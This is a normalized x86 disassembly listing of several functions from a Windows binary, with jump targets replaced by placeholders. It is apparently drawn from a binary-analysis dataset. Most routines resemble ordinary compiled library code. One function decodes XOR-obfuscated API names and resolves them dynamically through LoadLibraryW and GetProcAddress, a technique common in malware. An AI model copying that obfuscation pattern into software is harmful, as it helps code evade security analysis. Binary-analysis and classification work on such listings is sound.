xor eax [ ebp + ecx * 4 - 0x404 ]
inc esi
dec edx
jne r-xdata
sub_1005406a
push 0x38
mov eax sub_1007e8a6
call sub_10007703
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10009450
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1004770a
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_100276d6
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
call sub_1002a730
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x34 ] 0x0
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x3c ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_10019c00
retn 0x20
sub_10054118
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x14 ]
push esi
push edi
test ebx ebx
jne r-xdata
test edx edx
je r-xdata
test edx edx
jne r-xdata
call sub_10012991
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
test ebx ebx
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x10 ]
test ecx ecx
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov eax edx
cmp ebx 0xffffffff
jne r-xdata
xor eax eax
mov [ edx ] ax
jmp r-xdata
mov esi ecx
sub esi edx
mov esi edx
sub esi ecx
test ebx ebx
jne r-xdata
dec edi
je r-xdata
test edi edi
jne r-xdata
dec edi
jne r-xdata
xor ecx ecx
mov [ eax ] cx
dec ebx
jne r-xdata
xor eax eax
cmp ebx 0xffffffff
jne r-xdata
movzx eax [ ecx ]
mov [ esi + ecx ] ax
add ecx 0x2
test ax ax
je r-xdata
jmp r-xdata
movzx ecx [ esi + eax ]
mov [ eax ] cx
add eax 0x2
test cx cx
je r-xdata
mov [ edx ] ax
call sub_10012991
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov ecx [ ebp + 0xc ]
push 0x50
mov [ edx + ecx * 2 - 0x2 ] ax
pop eax
jmp r-xdata
call sub_1002788e
mov eax esi
jmp r-xdata
sub_100541e5
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1005e213
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10054290
push ebp
mov ebp esp
mov eax edx
push esi
lea esi [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp + 0x8 ]
sub eax esi
sar eax 0x1
push eax
push edx
call sub_10023990
pop esi
pop ebp
retn 0x4
sub_100542c0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
xor eax eax
push edi
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] al
mov eax [ ebp + 0x8 ]
push eax
push r--data
mov ecx 0x9
lea edi [ ebp - 0x10 ]
mov [ ebp - 0x14 ] 0x0
call sub_10012850
mov eax edi
add esp 0x8
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
lea edx [ eax + 0x1 ]
pop edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
lea ecx [ ebp - 0x10 ]
push ecx
mov ecx esi
call sub_1005d090
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_10054340
push edi
mov edi eax
cmp edi esi
je r-xdata
mov eax esi
pop edi
retn
mov eax [ edi + 0x8 ]
mov [ esi + 0x8 ] eax
mov ecx [ edi + 0x28 ]
push 0xffffffff
mov [ esi + 0x28 ] ecx
mov edx [ edi + 0x48 ]
push 0x0
lea eax [ edi + 0x2c ]
push eax
lea ecx [ esi + 0x2c ]
mov [ esi + 0x48 ] edx
call sub_1001c310
mov ecx [ edi + 0x4c ]
mov [ esi + 0x4c ] ecx
mov edx [ edi + 0x50 ]
mov [ esi + 0x50 ] edx
mov eax [ edi + 0x58 ]
mov [ esi + 0x58 ] eax
mov ecx [ edi + 0x5c ]
mov [ esi + 0x5c ] ecx
mov edx [ edi + 0x68 ]
push 0xffffffff
mov [ esi + 0x68 ] edx
mov eax [ edi + 0x6c ]
push 0x0
add edi 0x70
push edi
lea ecx [ esi + 0x70 ]
mov [ esi + 0x6c ] eax
call sub_1001c310
sub_100543c0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x4 ]
mov edx [ ebp + 0xc ]
cmp eax [ edx + 0x4 ]
jne r-xdata
xor eax eax
pop ebp
retn
mov ecx [ ecx ]
push eax
mov eax [ edx ]
push eax
push ecx
call sub_1001e162
add esp 0xc
test eax eax
jne r-xdata
mov eax 0x1
pop ebp
retn
sub_100543ef
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_1000363b
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_1002868d
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100029f0
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x1c
sub_10054460
push ebp
mov ebp esp
mov edx [ ebx + 0x8 ]
cmp edx 0x1ffffffe
jb r-xdata
inc edx
push edi
mov edi [ ebp + 0x10 ]
mov [ ebx + 0x8 ] edx
mov [ edi + 0x4 ] ecx
mov edx [ ebx + 0x4 ]
xor al al
cmp ecx edx
jne r-xdata
mov eax [ ebp + 0x10 ]
push eax
call sub_10065045
add esp 0x4
push r--data
call sub_100616c6
cmp [ ebp + 0xc ] al
je r-xdata
mov [ edx + 0x4 ] edi
mov ecx [ ebx + 0x4 ]
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
jmp r-xdata
mov [ ecx + 0x8 ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ ecx ] edi
mov edx [ ebx + 0x4 ]
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x8 ] edi
mov edx [ edi + 0x4 ]
mov ecx edi
cmp [ edx + 0x14 ] al
jne r-xdata
mov [ edx ] edi
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov ecx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edi
mov [ ecx + 0x14 ] 0x1
pop edi
pop ebp
retn 0xc
push esi
mov esi [ esi ]
cmp [ esi + 0x14 ] al
jne r-xdata
mov esi [ esi + 0x8 ]
cmp [ esi + 0x14 ] al
jne r-xdata
cmp ecx [ edx ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp ecx [ edx + 0x8 ]
jne r-xdata
mov [ edx + 0x14 ] 0x1
mov [ esi + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov ecx [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
jmp r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx + 0x8 ]
mov edi [ esi ]
mov [ edx + 0x8 ] edi
mov edi [ esi ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx ]
mov esi [ edx + 0x8 ]
mov [ ecx ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edx [ ecx + 0x4 ]
cmp [ edx + 0x14 ] al
je r-xdata
mov edx [ ecx + 0x4 ]
mov [ edx + 0x14 ] 0x1
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x14 ] al
mov edx [ ecx + 0x4 ]
mov edx [ edx + 0x4 ]
mov esi [ edx ]
mov edi [ esi + 0x8 ]
mov [ edx ] edi
mov edi [ esi + 0x8 ]
cmp [ edi + 0x15 ] al
jne r-xdata
mov ecx edx
mov edx [ ecx + 0x8 ]
mov esi [ edx ]
mov [ ecx + 0x8 ] esi
mov esi [ edx ]
cmp [ esi + 0x15 ] al
jne r-xdata
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edx [ ecx + 0x4 ]
mov esi [ edx + 0x4 ]
cmp edx [ esi ]
jne r-xdata
pop esi
mov edi [ edx + 0x4 ]
mov [ esi + 0x4 ] edi
mov edi [ ebx + 0x4 ]
cmp edx [ edi + 0x4 ]
jne r-xdata
mov [ edi + 0x4 ] edx
mov esi [ ecx + 0x4 ]
mov [ edx + 0x4 ] esi
mov esi [ ebx + 0x4 ]
cmp ecx [ esi + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] ecx
mov edi [ edx + 0x4 ]
cmp edx [ edi ]
jne r-xdata
mov [ edi + 0x4 ] esi
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi + 0x8 ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov edi [ edx + 0x4 ]
cmp edx [ edi + 0x8 ]
jne r-xdata
mov [ edi + 0x4 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov esi [ ecx + 0x4 ]
cmp ecx [ esi ]
jne r-xdata
mov [ esi + 0x4 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ edi ] esi
jmp r-xdata
mov [ esi ] edx
mov [ esi ] edx
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov [ edi ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov [ edi + 0x8 ] esi
mov [ esi + 0x8 ] edx
jmp r-xdata
mov edi [ ebp + 0x10 ]
mov [ edx + 0x4 ] esi
mov [ esi + 0x8 ] edx
mov [ esi ] edx
jmp r-xdata
mov [ edx ] ecx
mov [ ecx + 0x4 ] edx
sub_10054678
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_10044fed
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1002635d
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_1000d124
mov [ esi + 0x4 ] eax
sub_10054700
push esi
mov esi eax
mov eax [ esi ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x10 ] 0x0
je r-xdata
push eax
call edi
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov [ esi + 0x10 ] 0x0
mov eax [ esi + 0x18 ]
test eax eax
je r-xdata
push eax
call edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push eax
call edi
cmp [ esi + 0x50 ] 0x0
je r-xdata
push eax
call edi
add esi 0x54
cmp [ esi ] 0x0
je r-xdata
mov [ esi + 0x50 ] 0x0
pop edi
pop esi
retn
call sub_10017e40
sub_10054770
push ebp
mov ebp esp
push 0xffffffff
push sub_1007f4f0
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
xor edi edi
push 0x10
mov [ ebp - 0x4 ] edi
call sub_1005ac7e
add esp 0x4
cmp eax edi
je r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov ecx 0x1
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ esi + 0x4 ]
or eax 0xffffffff
[ edx ] eax
jne r-xdata
mov edx [ esi ]
mov eax [ edx ]
mov ecx esi
call eax
lea ecx [ esi + 0x8 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx esi
call edx
sub_10054830
push ebp
mov ebp esp
sub esp 0xbc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xbc ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0xb8 ] ebx
mov ebx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp - 0xb8 ]
push ebx
mov ebx [ ebp - 0xbc ]
push ebx
push edi
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
push esi
call sub_10004ed0
xor edi edi
mov [ esi ] r--data
mov [ esi + 0xb8 ] 0x0
mov [ esi + 0xbc ] edi
mov [ esi + 0xc0 ] edi
mov [ esi + 0xc4 ] edi
mov ecx [ r--data ]
xor eax eax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x73
and edx 0xff
mov [ ebp + eax * 2 - 0x3c ] dx
inc eax
cmp eax 0xb
jb r-xdata
lea ecx [ ebp - 0x3c ]
xor eax eax
push ecx
mov [ ebp - 0x26 ] ax
call [ LoadLibraryW@IAT ]
mov [ esi + 0xbc ] eax
cmp eax edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax esi
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x1c
mov edi [ r--data ]
xor dl dl
xor ecx ecx
mov bl [ ecx + edi ]
xor bl dl
xor bl 0x2c
inc dl
mov [ ebp + ecx - 0x14 ] bl
movzx ecx dl
cmp ecx 0xd
jb r-xdata
mov ebx [ GetProcAddress@IAT ]
lea edx [ ebp - 0x14 ]
push edx
push eax
mov [ ebp - 0x7 ] 0x0
call ebx
mov [ esi + 0xc8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xa0 ]
mov eax 0x53
call sub_10039350
mov ecx [ esi + 0xbc ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xcc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x78 ]
mov eax 0x57
call sub_10039350
mov eax [ esi + 0xbc ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xd0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x50 ]
mov eax 0x19
call sub_10039350
mov edx [ esi + 0xbc ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xd4 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0xb4 ]
mov eax 0x74
call sub_10039350
mov ecx [ esi + 0xbc ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xd8 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x24 ]
mov eax 0x49
call sub_10039350
mov eax [ esi + 0xbc ]
mov edx edi
push edx
push eax
call ebx
mov [ esi + 0xdc ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x8c ]
mov eax 0x40
call sub_10039350
mov edx [ esi + 0xbc ]
mov ecx edi
push ecx
push edx
call ebx
mov [ esi + 0xe0 ] eax
test eax eax
je r-xdata
lea edi [ ebp - 0x64 ]
mov eax 0x17
call sub_10039350
mov ecx [ esi + 0xbc ]
mov eax edi
push eax
push ecx
call ebx
mov [ esi + 0xe4 ] eax
test eax eax
je r-xdata
mov [ esi + 0xb8 ] 0x1
sub_10054a50
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x14 ] 0x6
je r-xdata
mov ecx [ eax + 0x38 ]
mov [ esi ] ecx
mov eax [ eax + 0x3c ]
lea edx [ ebp - 0x28 ]
mov eax 0x70
call sub_1000a6f0
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
sub_10054ac3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
cmp eax edi
jae r-xdata
mov ebx [ ebp + 0xc ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
push r--data
call sub_1003b4a6
test ebx ebx
je r-xdata
push r--data
call sub_100616c6
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
add eax ebx
push 0x0
push eax
mov ecx esi
mov [ ebp + 0x8 ] eax
call sub_10064dae
test al al
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x8
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ esi + 0x10 ]
sub edx edi
add edx edx
push edx
lea ecx [ ecx + edi * 2 ]
push ecx
lea ecx [ edi + ebx ]
lea eax [ eax + ecx * 2 ]
push eax
call sub_10077d10
add esp 0xc
push [ ebp + 0x10 ]
mov ecx esi
push ebx
push edi
call sub_1001df4d
cmp [ esi + 0x14 ] 0x8
mov eax [ ebp + 0x8 ]
mov [ esi + 0x10 ] eax
jb r-xdata
xor edx edx
mov [ ecx + eax * 2 ] dx
sub_10054b6f
push 0x60
mov eax sub_1007e3a6
call sub_10007703
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x18 ]
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x10 ]
mov edi [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
mov eax [ ecx + 0x14 ]
mov edx 0x3000
and eax edx
mov [ ebp - 0x68 ] ebx
cmp eax edx
jne r-xdata
lea eax [ ebp - 0x6c ]
push eax
call sub_10009450
and [ ebp - 0x4 ] 0x0
push eax
call sub_100519c6
or [ ebp - 0x4 ] 0xffffffff
pop ecx
lea ecx [ ebp - 0x6c ]
mov [ ebp - 0x64 ] eax
call sub_1002a730
mov ecx [ ebp - 0x64 ]
lea eax [ ebp - 0x48 ]
push eax
call sub_1002a674
push [ ebp - 0x60 ]
xor edi edi
inc edi
mov ecx esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x51 ] 0x0
call sub_100161f2
test al al
jne r-xdata
push edi
push ecx
push [ ebp - 0x60 ]
push esi
push ebx
push [ ebp + 0x8 ]
call sub_1003bc75
add esp 0x18
jmp r-xdata
mov eax [ ebp - 0x48 ]
xor ecx ecx
cmp [ ebp - 0x34 ] 0x10
mov [ ebp - 0x49 ] 0x0
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
jae r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
call sub_10019c00
retn
cmp [ eax ] 0x7f
je r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x2b
jne r-xdata
mov ecx esi
call sub_1004cd62
push [ ebp - 0x60 ]
mov ecx esi
call sub_100161f2
test al al
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
mov eax [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov [ ebx ] 0x2b
jmp r-xdata
push [ ebp - 0x60 ]
mov ecx esi
call sub_100161f2
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ eax ] cl
jle r-xdata
lea eax [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x2d
jne r-xdata
mov ecx esi
call sub_1004cd62
inc ebx
mov ecx esi
mov [ ebp - 0x50 ] ebx
call sub_10017b01
cmp [ ebp - 0x58 ] 0x0
mov edi [ ebp - 0x60 ]
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp - 0x38 ] ecx
jne r-xdata
mov [ ebx ] 0x2d
push edi
mov ecx esi
call sub_100161f2
test al al
jne r-xdata
jmp r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
mov bl [ esi + 0x5 ]
call [ eax + 0x4 ]
cmp bl al
jne r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp - 0x49 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x64 ]
mov eax [ ecx ]
call [ eax + 0x8 ]
mov [ ebp - 0x52 ] al
mov [ ebp - 0x52 ] cl
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
je r-xdata
mov ebx [ ebp - 0x58 ]
push edi
mov ecx esi
call sub_100161f2
test al al
je r-xdata
call sub_1001bc97
mov eax [ eax ]
mov ecx [ ebp - 0x50 ]
mov al [ eax ]
inc [ ebp - 0x50 ]
mov [ ecx ] al
mov ecx esi
call sub_10017b01
cmp [ ebp - 0x58 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1004cd62
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor ebx ebx
push ebx
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_1004b830
push [ ebp - 0x60 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_100161f2
test al al
jne r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
push edi
mov ecx esi
call sub_100161f2
test al al
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x5c ] 0x0
jge r-xdata
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov [ eax ] 0x30
cmp [ ebp - 0x58 ] 0x24
jl r-xdata
cmp [ ebp - 0x51 ] 0x0
jne r-xdata
lea edx [ ebp - 0x48 ]
cmp [ esi + 0x5 ] 0x30
jl r-xdata
mov ecx esi
call sub_1004cd62
mov eax [ ebp - 0x68 ]
jmp r-xdata
cmp [ ebp - 0x49 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1004cd62
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x5c ]
mov [ eax ] 0x30
cmp [ esi + 0x4 ] 0x0
jne r-xdata
inc [ ebp - 0x5c ]
jmp r-xdata
push 0x0
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_1001c5c0
jmp r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x1
lea ecx [ ebp - 0x48 ]
mov [ eax ] 0x0
call sub_1001c5c0
mov eax [ ebp - 0x5c ]
mov eax [ ebp - 0x50 ]
cmp [ esi + 0x5 ] 0x65
je r-xdata
mov ecx esi
call sub_1004cd62
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1004cd62
dec [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10017b01
cmp [ esi + 0x5 ] 0x30
jne r-xdata
mov ecx esi
call sub_1004cd62
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10017b01
push [ ebp - 0x60 ]
mov ecx esi
call sub_100161f2
test al al
je r-xdata
mov cl [ edx ]
cmp cl 0x7f
je r-xdata
cmp [ eax + ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x2c ]
cmp [ esi + 0x5 ] 0x39
jg r-xdata
mov ecx esi
call sub_1004cd62
mov eax [ ebp - 0x50 ]
inc [ ebp - 0x50 ]
mov ecx esi
mov [ eax ] 0x65
call sub_10017b01
push edi
mov ecx esi
mov [ ebp - 0x49 ] 0x0
xor ebx ebx
call sub_100161f2
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp ebx 0x24
jge r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ ebp - 0x58 ] 0x0
je r-xdata
dec ebx
je r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x58 ] 0x24
mov [ ebp - 0x49 ] 0x1
jl r-xdata
push edi
mov ecx esi
call sub_100161f2
test al al
jne r-xdata
cmp [ esi + 0x4 ] bl
jne r-xdata
cmp [ esi + 0x5 ] 0x45
jne r-xdata
mov ecx esi
call sub_1004cd62
mov ecx esi
mov [ ebp - 0x49 ] 0x1
call sub_10017b01
push edi
mov ecx esi
call sub_100161f2
test al al
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x50 ]
mov al [ esi + 0x5 ]
inc [ ebp - 0x50 ]
inc [ ebp - 0x58 ]
mov [ ecx ] al
mov ecx esi
call sub_1004cd62
test ebx ebx
jne r-xdata
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
